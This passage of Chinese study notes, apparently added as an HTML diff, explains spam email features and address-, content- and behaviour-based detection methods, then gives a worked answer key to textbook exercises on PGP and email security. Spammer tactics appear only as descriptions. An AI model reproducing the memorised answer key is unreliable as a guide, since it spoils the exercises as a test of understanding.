+<tr><td class="c">1</td><td><b>内容的重复性</b></td><td>内容的大量重复</td><td>垃圾邮件通常表现为内容的大量重复。</td></tr>
+<tr><td class="c">2</td><td><b>信息的合法性</b></td><td>查不到发件人信息</td><td>垃圾邮件通常<b>伪造发信人、收信人等信息</b>，<b>查询不到发件人、发件主机</b>的可能是垃圾邮件。</td></tr>
+<tr><td class="c">3</td><td><b>时间的有效性</b></td><td>不正常的发送时间</td><td>有时会更改发送时间。<b>有些垃圾邮件为了在客户端保持排列第一的位置，会将发送时间强行修改到一个超前的时间。</b></td></tr>
+<tr><td class="c">4</td><td><b>地址的有效性</b></td><td>无效的发送源地址</td><td>发送源地址<b>有相当一部分是伪造的</b>；也可通过入侵邮件系统服务器<b>篡改邮件发送的真实路径</b>，使合法邮件用户<b>无法回复或者查询其源地址</b>；而<b>合法邮件的发送地址和传输路径的地址都是真实存在的</b>。</td></tr>
+<tr><td class="c">5</td><td><b>邮箱名的有效性</b></td><td>名称由无意义字符串组成</td><td>很多垃圾邮件的<b>发送邮箱名是随机生成的无意义字符串</b>，与正常用户的邮箱名差别较大。</td></tr>
+<tr><td class="c">6</td><td><b>HTML 的合法性</b></td><td>不合法的 HTML tag，大量图片</td><td>有时会使用<b>不合法的 HTML tag（标签），如 iframe、frameset、object 等</b>，<b>嵌入的超链接、图片较多</b>。</td></tr>
+<tr><td class="c">7</td><td><b>邮件收件人数量大</b></td><td class="c">—<span class="small">（PPT 未列）</span></td><td>发送者通常把垃圾邮件发给许多用户，表现为<b>收信人地址数量非常多</b>。</td></tr>
+</tbody>
+</table>
+
+<h4>(B) 发送行为特征 <span class="pref">PPT p.39 的第 7 条</span> <span class="bref">课本 p.322</span></h4>
+<p><span class="pref">PPT 原话</span>：「<b>发送行为特征：大批量、时间短、发送源变换</b>」。<br>
+<span class="bref">课本把根因讲透了</span>：与一般邮件收发相比主要有<b>两点不同</b> ——</p>
+<div class="two">
+<div class="box" style="margin:.35em 0"><div class="box-t">第一：要在不被察觉的情况下发给尽可能多的人</div>
+<p>「垃圾邮件制造者希望垃圾邮件可以在<b>不被察觉</b>的情况下发送到世界上尽可能多的邮件用户，以达到利益最大化，所以他通常会在<b>相对集中的一段比较短的时间内大批量发送</b>垃圾邮件。」</p></div>
+<div class="box" style="margin:.35em 0"><div class="box-t">第二：源地址大批量且不断变换</div>
+<p>「如此多的垃圾邮件的发送源地址通常是大批量的，并且处于不断变换中。垃圾邮件制造者为了隐匿自身的存在，以躲避反垃圾邮件机制的监管，通常会<b>收集网络上存在的开放中继地址</b>，并通过软件来<b>随机编造虚假的或根本不存在的发件人地址</b>，<b>利用 SMTP 协议的漏洞，使用开放中继来完成垃圾邮件的发送</b>。」</p></div>
+</div>
+
+<p><b>这两点具体表现在以下 6 个可测量的指标上</b>（这 6 条正是「基于 SMTP 连接行为」检测的输入）：</p>
+<table class="tight">
+<thead><tr><th style="width:6%" class="c">#</th><th style="width:26%">指标</th><th>判据</th></tr></thead>
+<tbody>
+<tr><td class="c">1</td><td><b>同一 IP 的 SMTP 连接数</b></td><td>垃圾邮件通常大批量发送，<b>同一 IP 通常会对邮件服务器端口多次连接</b>。</td></tr>
+<tr><td class="c">2</td><td><b>同一 IP 的 SMTP 连接频率</b></td><td>发送垃圾邮件时，同一 IP 通常对服务器端口的<b>连接频率表现出一定规律</b>。</td></tr>
+<tr><td class="c">3</td><td><b>同一主题的邮件数量大</b></td><td>如果<b>相同主题的邮件转发次数较多</b>，很可能是垃圾邮件。</td></tr>
+<tr><td class="c">4</td><td><b>同一 IP 发送的邮件数量大</b></td><td>如果同一 IP 地址发送的邮件数量<b>超过一定阈值</b>，该 IP 很可能在发送垃圾邮件。</td></tr>
+<tr><td class="c">5</td><td><b>同一邮箱账号的发送邮件数量大</b></td><td>同上，超过一定阈值则该邮箱很可能在发送垃圾邮件。</td></tr>
+<tr><td class="c">6</td><td><b>发送时间</b></td><td><b>合法邮件的发送时间呈现一定规律</b>，如果在<b>非高峰时段内</b>发送邮件则有可能是在发送垃圾邮件。</td></tr>
+</tbody>
+</table>
+
+<h3>4.3 三类反垃圾邮件检测方法 <span class="pref">PPT p.40</span> <span class="bref">课本 10.5.1–10.5.3</span></h3>
+
+<div class="box key">
+  <div class="box-t">★ 先把 PPT p.40 这一页的分类框架背下来（简答 7 就考这个）</div>
+  <p><b>① 基于地址</b>：黑白名单检测、反向域名验证技术<br>
+  <b>② 基于内容</b>：分布式协作法、规则过滤法、统计过滤法、关键词过滤法<br>
+  <b>③ 基于行为</b>：基于邮件通信拓扑相似性、基于邮件用户社交关系、基于 SMTP 连接行为</p>
+  <p><b>一句话记住三者的区别：地址看"谁发的"，内容看"写了什么"，行为看"怎么发的"。</b></p>
+  <p class="small"><span class="bref">课本 p.323 补充</span>：「目前，大部分邮件服务器均支持垃圾邮件的检测及过滤功能，通常将识别出来的垃圾邮件放置在<b>独立的文件夹</b>中（如垃圾邮件、广告邮件等）。<b>如果出现误判，用户可手工将其移动到正常邮件收件箱中。</b>」<span class="pref">PPT p.41</span> 贴的网易 163 收费邮箱截图就是这个——它把<b>广告邮件和垃圾邮件分开放在两个不同的文件夹中</b>，页面上写着「广告邮件自动删除 14 天以上的邮件（网易反垃圾系统已帮您拦截 99.8% 的垃圾邮件）」。</p>
+</div>
+
+<h4>① 基于地址的检测 <span class="bref">课本 10.5.1</span></h4>
+
+<h5 style="margin:.55em 0 .2em;font-size:.98em">黑白名单检测技术</h5>
+<div class="box">
+  <p><b>黑名单的原理</b>：「<b>提前对邮件发送源所发送的邮件性质进行预判，拦截来自身份明确的垃圾邮件发送源所发送的垃圾邮件</b>，是<b>最早出现的一种垃圾邮件检测技术</b>。
+  其原理是：将已经识别的与垃圾邮件有关的<b>开放中继或邮件源地址记录到数据库（黑名单）中，并通过域名系统为垃圾邮件过滤系统提供查询服务</b>。
+  当新邮件到来时，检测系统首先检查电子邮件<b>头部的发件人的服务器地址、代理服务器地址和发件人邮箱地址</b>等相关信息，与黑名单中的信息进行匹配，一致则<b>判定为垃圾邮件并进行拦截或拒收</b>。」</p>
+  <p><b>为什么后来不好用了</b>：「垃圾邮件刚出现时由于制作技术较为简单，通常邮件来源比较稳定，一般发送方 IP、域名地址和邮箱地址变化不大，因此比较容易收集整理出黑名单。
+  随着垃圾邮件制作技术的迅速发展，当今的垃圾邮件发送者通常会采取<b>伪装、编造和盗用源地址</b>等手段不断变换发送方地址，因此<b>静态的黑名单很难应对垃圾邮件，必须不断地动态更新</b>。」</p>
+  <p><b>著名反垃圾邮件组织</b>（提供垃圾邮件地址黑名单服务）：<b>Spamhaus、Spamcop、CAUSE、MAPS</b>。
+  「<b>一旦某个 IP 地址被纳入这些反垃圾邮件组织的黑名单，世界上很多邮件服务器就会拒收该 IP 地址发送的任何邮件。</b>」<span class="small">← 这正是 §4.1 危害第 ④ 条的机制。</span></p>
+  <p><b>白名单</b>：「正好和黑名单相反，<b>被列入白名单中的发件人发送的任何电子邮件都将被判断为合法邮件</b>。对于某些用户来说<b>可能宁可多接收一些垃圾邮件，也不愿意漏掉一封合法邮件</b>，所以用户可以根据需要来定义、设置和维护自己的白名单。<b>白名单技术以其操作简易、方便实施和系统负载小等优点被广泛应用在垃圾邮件过滤系统中，以降低误判率。</b>」</p>
+</div>
+<table class="tight">
+<thead><tr><th style="width:14%">技术</th><th style="width:30%">优点</th><th>不足（课本原文，简答 7 的得分点）</th></tr></thead>
+<tbody>
+<tr><td><b>黑名单</b></td><td rowspan="2">「黑名单或白名单检测技术是<b>常用、简单、快捷、有效</b>的垃圾电子邮件检测方法」</td><td><b>「黑名单不可能涵盖所有的垃圾邮件地址，容易『殃及无辜』，致使用户丢失合法邮件，垃圾邮件检测总体效率不高。」</b></td></tr>
+<tr><td><b>白名单</b></td><td><b>「白名单由于『门槛』低，大量垃圾邮件涌入，所以经常达不到预期效果。」</b></td></tr>
+<tr><td colspan="3">「因此，在实际应用中，<b>黑名单和白名单通常结合起来应用，合称为『黑白名单检测技术』</b>。」</td></tr>
+</tbody>
+</table>
+
+<h5 style="margin:.55em 0 .2em;font-size:.98em">反向域名验证技术</h5>
+<div class="box">
+  <p><b>先看"合法邮件的地址"长什么样</b>（课本给了四条判据）：<br>
+  ① <b>Mail From 后的地址和邮件内容中 From 后的地址相同</b>；<br>
+  ② <b>发件人地址是该域中真实合法的地址</b>；<br>
+  ③ <b>发送方 IP 地址应该是 Mail From 后的地址域中允许该域名发送邮件的计算机地址</b>；<br>
+  ④ <b>To 后地址可以与 Rcpt To 后的地址不同。</b><span class="small">（注意这一条是"可以不同"——群发和密送就是这么来的，不能拿它当垃圾判据。）</span></p>
+  <p><b>做法</b>：「针对虚假或伪装源地址形式的垃圾邮件，反向域名验证技术<b>采集分析 SMTP 会话和邮件头部中的地址信息，通过 DNS 对准备接收的邮件发送 IP 地址进行反向解析</b>。
+  如果反向 DNS 查询可以通过邮件传输路径中的地址<b>逐步追查到其源地址，则认为该邮件合法并接收</b>；
+  如果<b>追查不到其源地址或者查询的源地址不存在，则认为该邮件可能存在问题而拒绝接收</b>。」</p>
+  <p><b>致命缺点</b>：<b>「由于邮件系统中大部分 DNS 服务器没有开放反向解析查询权限，致使反向域名解析过滤垃圾邮件技术的误判率较高，严重影响邮件用户的正常使用，因此该技术很难被推广。」</b></p>
+</div>
+
+<h4>② 基于内容的检测 <span class="bref">课本 10.5.2</span></h4>
+<p>「基于内容的垃圾邮件检测技术通过<b>对邮件内容进行分析</b>来识别垃圾邮件。当前常用的基于内容识别的垃圾邮件检测方法<b>主要分为四类</b>：<b>分布式协作法、规则过滤法、统计过滤法、关键字过滤法</b>。」</p>
+<table class="tight">
+<thead><tr><th style="width:12%">方法</th><th style="width:34%">原理</th><th>优点</th><th style="width:26%">缺点</th></tr></thead>
+<tbody>
+<tr><td><b>分布式<br>协作法</b></td><td><b>大量邮件服务器共享垃圾邮件的指纹信息</b>，并以此作为检测依据。邮件服务器在接收到邮件后，<b>首先利用哈希算法对邮件中的指纹数据进行计算，生成邮件的指纹</b>，如果用户或服务器判断其为垃圾邮件，则<b>将指纹数据共享给其他有协作关系的邮件服务器</b>作为检测依据。</td><td><b>「在应对大范围爆发的蠕虫等病毒入侵式垃圾邮件方面有很好的拦截效果」</b>——这类垃圾邮件特征是<b>数量大、易分析、极相似、变化小</b>，很容易被识别。</td><td>① <b>「假如垃圾邮件小规模传送，内容又是变化很大的情况下，该方法就很难发挥作用。」</b><br>② <b>「此类方法需要邮件用户自行上报垃圾邮件，但是很多邮件用户并没有自主上报的习惯。」</b></td></tr>
+<tr><td><b>规则<br>过滤法</b></td><td><b>对垃圾邮件进行人为的分析，整理出其相应的特征信息</b>，将这些特征设定成<b>邮件信头部分和内容部分的匹配规则</b>，即通过学习和训练得到的<b>显性规则</b>，然后将接收的邮件与规则进行比较计算来判别邮件是否合法。<b>规则的学习训练过程即是归纳总结的过程</b>，所有的规则都是通过对样本进行训练和学习总结而形成的。<br><span class="small">常用的有 <b>Ripper、Decision Tree（决策树法）、Boosting、Rough Set</b>。其中决策树法采用的算法主要有 <b>C4.5、ID3 和 C5.0</b>，通过对训练集中<b>具有较高权值的单词和邮件头信息</b>的学习和训练，构造决策树模型对垃圾邮件进行识别，<b>该方法应用在小规模训练集的垃圾邮件比率较高的邮件中表现出较好效果</b>。</span></td><td><b>「设定的规则便于人理解，原理简单，易于操作，在某种程度上满足一般用户的要求。」</b></td><td>① <b>「需要根据用户的不同需求长时间手动维护和调整规则，因此依靠人的主观因素较多，缺乏灵活性，不利于及时更新。」</b><br>② <b>「该方法对用户专业技术能力要求较高。」</b><br>③ <b>「误判率较高，较适合作为其他过滤技术的辅助手段。」</b><br><span class="small">（后来也发展出了具有动态学习功能的规则。）</span></td></tr>
+<tr><td><b>统计<br>过滤法</b></td><td><b>将邮件内容部分进行分词</b>，即把内容部分划分成<b>固定长度的单词向量和字串</b>，然后<b>提取特征值</b>，运用<b>概率统计</b>知识通过<b>合法邮件和垃圾邮件样本的训练</b>建立一系列的<b>分类模型</b>，并利用这样的模型对这些字串和向量进行<b>评分</b>，从而过滤垃圾邮件。<br><span class="small">常见算法：<b>k 临近算法、贝叶斯算法、支持向量机、Winnow 算法和神经网络算法</b>。</span></td><td><b>「依赖样本训练集的实时性，可以自适应学习建立识别模型。」</b></td><td><b>「其分类模型的非共享性，即一个邮件用户训练出来的分类模型很难适应另一个邮件用户的需求，所以该方法推广性较差。」</b></td></tr>
+<tr><td><b>关键字<br>过滤法</b></td><td><b>将垃圾邮件主题中经常出现的字词建立一个词汇表并赋予一定的权值</b>，作为判别垃圾邮件的依据。过滤系统在收到邮件后，会<b>对邮件主题中的词汇进行分析，通过关联垃圾邮件主题词汇表中的信息计算权值，如果该邮件权值超过指定阈值则认为该邮件不合法，并拒绝接收</b>。</td><td><b>「针对的是邮件主题，可以有效识别一些主题明显的垃圾邮件。」</b></td><td>① <b>「需要建立一个数量庞大的关键字列表，它的识别准确率和词汇表中的信息的完备性密切相关。」</b><br>② <b>「词汇表太大也会消耗邮件服务器的大量系统资源。」</b></td></tr>
+</tbody>
+</table>
+
+<h4>③ 基于行为的检测 <span class="bref">课本 10.5.3</span></h4>
+
+<div class="box key">
+  <div class="box-t">它是为了补什么洞才出现的（这段是简答 7 的关键论据）</div>
+  <p><b>课本原文</b>：「前面介绍的基于地址的垃圾邮件检测技术和基于内容的垃圾邮件检测技术虽然可以较为有效地识别垃圾邮件，但是这些方法<b>都有其各自的局限性，特别是涉及检测依据需要不断更新，有特征提取及匹配的计算量比较大等缺点</b>。」</p>
+  <p><b>基本原理</b>：「在邮件传输过程中，<b>获取大量邮件发送样本的行为信息，如发送时间、频率和 IP 地址等，进行有针对性的分析、学习和训练，建立一套对付垃圾邮件的行为识别模型</b>，进而分析判断邮件是否合法。」</p>
+  <p><b>最大特点（四条优点，全是课本原文）</b>：<br>
+  ① <b>「不必完整接收邮件，不必查看邮件中的具体内容」</b>；<br>
+  ② <b>「由于与邮件内容无关，进而避免了类似其他反垃圾邮件技术对邮件内容异常烦琐的分析和计算」</b>；<br>
+  ③ <b>「大大减轻了网络资源的占用，提高了垃圾邮件过滤系统的处理能力和速度」</b>；<br>
+  ④ <b>「同时由于其不用打开邮件内容，也避免了对个人隐私的侵犯」</b>。<br>
+  <span class="small">→ ④ 这条经常被漏掉，但它是基于行为相对于基于内容<b>独有</b>的优势。</span></p>
+</div>
+
+<table class="tight">
+<thead><tr><th style="width:20%">方法</th><th>怎么做（课本原文要点）</th></tr></thead>
+<tbody>
+<tr><td><b>基于邮件通信<br>拓扑相似性</b></td><td>「通过对邮件收发件人的<b>通信关系建模</b>，把<b>收发件人作为顶点、通信行为作为有向边</b>建立通信关系网络拓扑，<b>计算相似度将邮件用户划分成若干用户群</b>，然后通过<b>计算用户属于哪个群</b>来判别该用户发送的邮件是否合法。<br><b>由于合法用户之间通信通常是双向交流的，而垃圾邮件发送为了追逐利益大宗发送不考虑用户通信关系，所以该方法利用发件人的行为动机来识别垃圾邮件。</b>」<br><span class="small">→ 判据的本质：<b>正常人是"你来我往"，群发者是"只出不进"。</b></span></td></tr>
+<tr><td><b>基于邮件用户<br>社交关系</b></td><td>「考虑到通常情况下<b>邮件用户之间的合法通信是在具有一定社交关系的用户之间</b>这一现象，该方法<b>利用社交网络的社团划分算法将邮件用户通信关系划分为若干个用户社团</b>，<b>社团内的用户间通信一般是正常的，而社团间联系较少或从来没有联系的用户之间通信是可疑的</b>，以此判断邮件的合法性。」</td></tr>
+<tr><td><b>基于 SMTP<br>连接行为</b></td><td>「通过对 SMTP 连接时的<b>连接时间、频率、流量、对应主机名和域名、PTR 记录</b>等特征，对邮件发送方的行为进行识别从而判断垃圾邮件。<b>当前流行的识别方法中，利用检测用户连接频率来识别垃圾邮件的方法就是以这个原理为基础的。</b><br>常用的 <b>Postfix</b> 邮件服务器可以通过<b>记录用户出现错误的次数，对可疑的用户延迟响应时间，延迟时间能够随着错误数量的增加而增加</b>。当用户出错次数超过一个阈值时，服务器就会与该用户断开连接，从而增强了对大宗垃圾邮件的识别能力。」<br><span class="small">→ 这就是所谓的 <b>tarpitting（焦油坑）</b>：不拒绝你，只是<b>越来越慢地回你</b>，把群发者的时间成本拖垮。</span></td></tr>
+</tbody>
+</table>
+
+<h3>4.4 三类方法的横向对比</h3>
+<div class="box key">
+  <div class="box-t">这三类方法的完整优缺点对照，写在 §5 简答 7 那一题里</div>
+  <p>因为课本<b>简答 7 就是这道题</b>，答案要成段落地写，所以对照表直接做成了可誊抄的答案，<b>见 §5.2 简答第 7 题</b>，此处不重复。<br>
+  这里只留一句判据：<b class="mark">地址看「谁发的」，内容看「写了什么」，行为看「怎么发的」</b>；
+  三类各有死角，<b>实际系统总是组合使用</b>。</p>
+</div>
+<div class="box exam">
+  <div class="box-t">★ 单选 9「下列关于垃圾邮件检测所依赖的邮件信息中，说法<b>不正确</b>的是」→ <b>D. 以上都不是</b></div>
+  <p>选项 A 邮件地址、B 邮件内容、C 邮件行为，<b>恰好就是本节三类检测方法的三个依据，全都正确</b>；
+  所以"说法不正确"的只能是 D 这个选项本身。<b>这道题实际上是在考你能不能背出这三类分法。</b></p>
+</div>
+<h2 class="pagebreak"><span class="n">§5</span>课本习题全解 <span class="bref">课本 10.6（p.327–328）</span></h2>
+
+<div class="box">
+  <div class="box-t">关于答案来源，说明一下</div>
+  <p><b>15 道单选</b>：课本上已有答案，我<b>逐题对着课文原文复核了一遍</b>，全部一致；下面除答案外还给出<b>判据</b>和<b>错项为什么错</b>。<br>
+  <b>12 道简答</b>：<b>课本没有给答案</b>，下面的答案是我按课本原文整理的，标出了出处页码，<b>可以直接誊抄</b>。</p>
+</div>
+
+<h3>5.1 单项选择题（15 题）</h3>
+<div class="qcols">
+
+<div class="q"><div class="qt"><span class="qn">1.</span>如果想将用户在电子邮件客户端上对邮件执行的管理操作（如将一封邮件从垃圾邮件文件夹移送到收件箱）同时也反映到邮件服务器中，则应采用的邮件接收协议是（　）。</div>
+<div class="opts">A. POP3　　B. SMPT　　C. IMAP　　D. HTTP</div>
+<div class="ans"><b>C</b>　<b>判据</b>：POP3 是<b>脱机</b>邮件处理协议，客户端的移动、标记已读等操作<b>不会反馈到服务器</b>；IMAP4 把邮件服务器当成<b>「远程文件服务器」</b>访问，操作会同步。<br>
+<b>错项</b>：A 正好相反；B 是 SMTP 的拼写错误，且 SMTP 是<b>发送</b>协议；D 是 WebMail 用的传输协议，不是邮件接收协议。</div></div>
+
+<div class="q"><div class="qt"><span class="qn">2.</span>下列方案中，<b>不属于</b>安全电子邮件解决方案的是（　）。</div>
+<div class="opts">A. PEM　　B. S/MIME　　C. PGP　　D. HTTP</div>
+<div class="ans"><b>D</b>　<b>判据</b>：端到端的安全电子邮件解决方案<b>只有三种：PEM、PGP、S/MIME</b>（课本 p.310）。HTTP 是超文本传输协议，本身<b>不提供任何安全功能</b>。<br><span class="small">补一句易错点：加了 S 的 HTTPS 也只是"传输安全增强"，属于第②类措施，仍然<b>不是端到端安全邮件方案</b>。</span></div></div>
+
+<div class="q"><div class="qt"><span class="qn">3.</span>下列电子邮件的安全属性中，PGP <b>不支持</b>的是（　）。</div>
+<div class="opts">A. 可用性　　B. 机密性　　C. 完整性　　D. 不可否认性</div>
+<div class="ans"><b>A</b>　<b>判据</b>：课本表 10-1 的四项安全需求是<b>机密性、完整性、不可否认性、真实性</b>，<b>压根没有"可用性"</b>。<br>
+<b>本质</b>：PGP 是在<b>邮件正文</b>上做密码学处理，管得了"能不能被看/被改/赖不赖账"，<b>管不了"服务在不在"</b>——邮件炸弹把你邮箱塞爆，PGP 一点办法没有。</div></div>
+
+<div class="q"><div class="qt"><span class="qn">4.</span>在 PGP 中，关于加密、签名、压缩的操作顺序说法正确的是（　）。</div>
+<div class="opts">A. 先签名，再压缩，最后加密　　B. 先压缩，再加密，最后签名<br>C. 先加密，再压缩，最后签名　　D. 先签名，再加密，最后压缩</div>
+<div class="ans"><b>A</b>　<b>判据</b>：课本 p.312「在 PGP 中，是对<b>未压缩</b>的邮件正文进行散列计算后，再对散列值进行<b>签名</b>，将邮件正文和签名<b>拼接后再进行压缩后加密</b>」。<br>
+<b>秒杀三个错项</b>：B、C 把签名放在<b>最后</b>——那就是对密文签名，接收方没解密前无法验签，且签名与明文脱钩；D 把压缩放在<b>加密之后</b>——密文接近随机数，<b>根本压不动</b>。详细理由见 §2.6 讨论一。</div></div>
+
+<div class="q"><div class="qt"><span class="qn">5.</span>在 PGP 中，会话密钥的安全交换采用的技术称为（　）。</div>
+<div class="opts">A. 数字信封　　B. Diffie-Hellman　　C. 线下交换　　D. KDC</div>
+<div class="ans"><b>A</b>　<b>判据</b>：课本 p.312 原话——用公开密码算法对会话密钥加密、再用会话密钥加密报文，「这种<b>链式加密方法（也称为"数字信封"）</b>」。<br>
+<b>错项</b>：B 是双方<b>协商</b>出密钥，而 PGP 是<b>发送方单方随机生成后送过去，不需要和接收方协商</b>；C 不现实；D 需要在线的可信第三方，那是 Needham-Schroeder 的路子，PGP 没有 KDC。</div></div>
+
+<div class="q"><div class="qt"><span class="qn">6.</span>在 PGP 消息中，<b>不能</b>用会话密钥加密的部分是（　）。</div>
+<div class="opts">A. 邮件正文　　B. 接收者的公钥标识　　C. 签名　　D. 发送者的公钥标识</div>
+<div class="ans"><b>B</b>　<b>判据</b>：看图 10-4——<b>会话密钥部分（KID<sub>B</sub> + K<sub>s</sub>）是用 PU<sub>B</sub> 加密的</b>，只有「签名 + 报文」那一大块才用 K<sub>s</sub> 加密。<br>
+<b>为什么必须如此</b>：KID<sub>B</sub> 的作用是告诉接收者"用你的哪把私钥解会话密钥"。若它也被 K<sub>s</sub> 加密，接收者就得<b>先有 K<sub>s</sub> 才能读到它，而读它正是为了拿到 K<sub>s</sub></b>——死循环。<br>
+<b>错项</b>：A 邮件正文、C 签名、D KID<sub>A</sub> 全在「签名 + 报文」块内，都被 K<sub>s</sub> 加密。<span class="small">（别把 KID<sub>A</sub> 和 KID<sub>B</sub> 记反：<b>KID<sub>A</sub> 在签名部分，KID<sub>B</sub> 在会话密钥部分</b>。）</span></div></div>
+
+<div class="q"><div class="qt"><span class="qn">7.</span>PGP 主要采用的信任模型是（　）。</div>
+<div class="opts">A. 用户为中心的信任模型　　B. 信任树模型　　C. 交叉认证模型　　D. Web 模型</div>
+<div class="ans"><b>A</b>　<b>判据</b>：课本 p.315 原话「PGP 主要采用<b>以用户为中心的信任模型</b>，也就是<b>信任网模型（Web of Trust）</b>」。<br>
+<b>错项</b>：B 信任树、C 交叉认证是 <b>X.509/PKI</b> 那一套（有统一权威、层次结构）；D「Web 模型」指的是<b>浏览器内置根证书</b>那种模型——<b>别被 Web of Trust 里的 "Web" 带偏，此 Web 是"网状"不是"万维网"</b>。</div></div>
+
+<div class="q"><div class="qt"><span class="qn">8.</span>如果要在<b>网络层</b>保护电子邮件的安全，则应采用的协议是（　）。</div>
+<div class="opts">A. IP　　B. TLS　　C. PGP　　D. IPSec</div>
+<div class="ans"><b>D</b>　<b>判据</b>：课本 p.310「在<b>网络层或传输层</b>使用安全协议（<b>IPsec, SSL/TLS</b>）」——其中 <b>IPsec 在网络层，SSL/TLS 在传输层</b>。<br>
+<b>错项</b>：A 是网络层协议但<b>本身不提供安全</b>；B 在<b>传输层</b>（题目问网络层）；C 在<b>应用层</b>。<span class="small">这道题实际考的是"分层"，把三个协议按层排好就不会错。</span></div></div>
+
+<div class="q"><div class="qt"><span class="qn">9.</span>下列关于垃圾邮件检测所依赖的邮件信息中，说法<b>不正确</b>的是（　）。</div>
+<div class="opts">A. 邮件地址　　B. 邮件内容　　C. 邮件行为　　D. 以上都不是</div>
+<div class="ans"><b>D</b>　<b>判据</b>：课本 10.5「检测方法主要分为三类：<b>基于地址的、基于内容的和基于行为的</b>检测技术」——A、B、C 三个依据<b>全都正确</b>，所以"说法不正确"的只剩 D 这个选项本身。</div></div>
+
+<div class="q"><div class="qt"><span class="qn">10.</span>下列密钥算法中，PGP <b>没有</b>用来加密会话的密码算法是（　）。</div>
+<div class="opts">A. DES　　B. 3DES　　C. RSA　　D. CAST-128</div>
+<div class="ans"><b>C</b>　<b>判据</b>：表 10-2 中"消息加密"一行的<b>对称密码算法</b>才是用来加密邮件内容（会话）的；<b>RSA 属于公开密码算法，在 PGP 里只干两件事——对散列值签名、加密会话密钥，从不直接加密邮件正文</b>。<br>
+<span class="small">A、B、D 都是对称算法（DES 及其升级 3DES 出现在 ANSI X 9.17 的算法列表中，CAST-128 是表 10-2 明列的），因此都能用于会话加密。</span></div></div>
+
+<div class="q"><div class="qt"><span class="qn">11.</span>当用户 A 往公钥环中插入一个新的公钥时，PGP 必须为该公钥的拥有者可信性字段设定一个标志，指示公钥拥有者的信任程度。如果用户 A 插入的新公钥<b>不是自己的</b>公钥时，应该由（　）来指定该公钥的拥有者的可信性字段值。</div>
+<div class="opts">A. 用户　　B. PGP　　C. 用户或 PGP　　D. 公钥的拥有者</div>
+<div class="ans"><b>A</b>　<b>判据</b>：课本 p.316「否则，<b>PGP 将询问用户 A，让用户给定信任级别</b>」。三个信任字段里<b>只有"拥有者可信性"是人工指定的</b>，另外两个（密钥合法性、签名可信性）都是 PGP 自己算的。<br>
+<b>错项 D 尤其要警惕</b>：公钥的拥有者当然不能自己给自己定"你该多信我"——那等于让被评价者打分。</div></div>
+
+<div class="q"><div class="qt"><span class="qn">12.</span>当用户 A 往公钥环中插入一个新的公钥时，只有当（　）时，该公钥的拥有者可信性字段值一定是"绝对信任"的。</div>
+<div class="opts">A. 任何人的公钥　　B. 该公钥是用户 A 自己的公钥<br>C. 该公钥的拥有者信任的另一个　　D. 无须前提条件</div>
+<div class="ans"><b>B</b>　<b>判据</b>：课本 p.316「<b>如果用户 A 插入的新公钥是自己的</b>，则它也将被插入到用户 A 的私钥环中，<b>PGP 自动指定其密钥合法性字段标志为密钥合法，拥有者可信性字段标志为绝对信任</b>」。<br>
+<b>本质</b>：<b>你对自己当然是绝对信任的</b>，这是整个信任网唯一的"自明起点"；别人的一律要问你。</div></div>
+
+<div class="q"><div class="qt"><span class="qn">13.</span>在某学校网络安全课程实验"Windows 环境下安装和使用 Wireshark"实施过程中，很多同学发现自己用 Wireshark 可以抓到使用 WebMail 登录学校邮箱时输入的用户名和口令，但却看不到登录 QQ 邮箱时输入的用户名和口令，最可能的原因是（　）。</div>
+<div class="opts">A. QQ 邮箱服务器只允许 HTTPS 协议登录　　B. 学校邮箱服务器只允许 HTTPS 协议登录<br>C. Wireshark 安装或使用方法不对　　D. QQ 邮箱服务器只允许 HTTP 协议登录</div>
+<div class="ans"><b>A</b>　<b>判据</b>：WebMail 靠<b>提交表单</b>传口令。走 HTTP 时表单内容<b>明文</b>在线上跑，抓包即见；走 <b>HTTPS 时被 TLS 加密</b>，抓到的只是密文。<br>
+<b>错项</b>：B 与"能抓到学校邮箱的口令"<b>直接矛盾</b>（若学校强制 HTTPS 就抓不到了）；C 与"学校的能抓到"矛盾（工具是好用的）；D 说反了——只允许 HTTP 恰恰应该<b>能</b>抓到。</div></div>
+
+<div class="q"><div class="qt"><span class="qn">14.</span>下列安全协议中，<b>没有</b>采用公开密码算法进行对称会话密钥分发的是（　）。</div>
+<div class="opts">A. PGP　　B. Needham-Schroeder　　C. TLS　　D. SSL</div>
+<div class="ans"><b>B</b>　<b>判据</b>：<b>Needham-Schroeder（对称密钥版）依靠可信第三方 KDC</b> 和"双方各自与 KDC 共享的对称主密钥"来分发会话密钥，<b>全程只用对称密码 + 随机数（nonce）防重放，不用公钥</b>。<br>
+A/C/D 都用公钥来传会话密钥：PGP 用接收方公钥加密 K<sub>s</sub>（数字信封），SSL/TLS 的 RSA 密钥交换用服务器公钥加密 pre_master_secret。</div></div>
+
+<div class="q"><div class="qt"><span class="qn">15.</span>下列安全协议中，<b>不能</b>用来建立 VPN 安全隧道的是（　）。</div>
+<div class="opts">A. SSL　　B. TLS　　C. PGP　　D. IPsec</div>
+<div class="ans"><b>C</b>　<b>判据</b>：VPN 隧道要把<b>整条链路上的流量</b>封装保护起来，这必须由<b>网络层（IPsec）或传输层（SSL/TLS）</b>协议来做。<br>
+<b>PGP 是应用层的、面向"一封邮件"的端到端加密</b>——它加密的是<b>一份数据（邮件正文）</b>，不是一条<b>连接</b>，因此建不了隧道。<br>
+<span class="small">→ 这道题和第 3、8 题是同一个考点的三种问法：<b>PGP 的作用域仅限"邮件正文"这一份数据</b>。</span></div></div>
+
+</div>
+
+<h3>5.2 简答题（12 题，课本未给答案）</h3>
+
+<div class="q big"><div class="qt"><span class="qn">1.</span>分析电子邮件协议的安全缺陷。</div>
+<div class="ans"><b>答</b>　<b>根本原因</b>：基于 SMTP、POP3/IMAP 等协议的电子邮件系统<b>本身没有采取必要的安全防护措施</b>——邮件的发送和接收<b>没有经过鉴别和确认</b>，邮件内容<b>没有经过加密</b><span class="bref">p.309</span>。具体缺陷有：<br>
+① <b>机密性缺失</b>：SMTP 发送邮件时邮件<b>以明文方式在网上传输，也以明文方式保存在邮件服务器的用户邮箱中</b>。只要能进入用户邮箱或在传输过程中截获，就能看到原始文件。<br>
+② <b>真实性缺失</b>：<b>发邮件时不需要身份认证，任何人都可以冒名发送电子邮件</b>，因此用户接收的邮件可能并非其所声称的发件人所发——导致<b>电子邮件欺骗、钓鱼邮件</b>。<br>
+③ <b>完整性缺失</b>：攻击者截获后<b>甚至可以更改邮件的内容</b>，而<b>邮件的接收者无法知道所接收的邮件是否真实</b>。<br>
+④ <b>不可否认性缺失</b>：没有签名机制，<b>发送人可以否认自己发过的邮件</b>。<br>
